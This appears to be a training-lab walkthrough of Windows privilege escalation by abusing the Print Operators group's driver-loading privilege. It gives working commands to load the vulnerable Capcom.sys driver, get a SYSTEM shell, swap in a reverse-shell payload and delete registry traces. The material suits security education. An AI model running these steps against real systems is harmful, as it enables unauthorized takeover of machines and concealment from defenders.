The [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) group grants its members the `SeLoadDriverPrivilege`, right to manage, create, share, and delete printers connected to a domain controller, as well as the ability to log on locally to a domain controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

### Confirming Privileges
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

### Checking Privileges Again

The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative shell and input the credentials of the account that is a member of the print operators group, we can see here that `SeLoadDriverPrivilege`is visible but disabled.
```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.
```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.

### Compile with cl.exe
```cmd-session
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

### Add Reference to Driver

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
```cmd-session
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

### Verify Driver is not Loaded

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.
```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

### Verify Privilege is Enabled
\
Run the `EnableSeLoadDriverPrivilege.exe` binary.
```cmd-session
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

### Verify Capcom Driver is Listed
```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

### Use ExploitCapcom Tool to Escalate Privileges

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.
```powershell-session
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

This launches a shell with SYSTEM privileges.
![[capcomexploit.webp]]

## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

## Automating the Steps

### Automating with EopLoadDriver

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:
```cmd-session
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

## Clean-up

### Removing Registry Key

We can cover our tracks a bit by deleting the registry key added earlier.
```cmd-session
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".
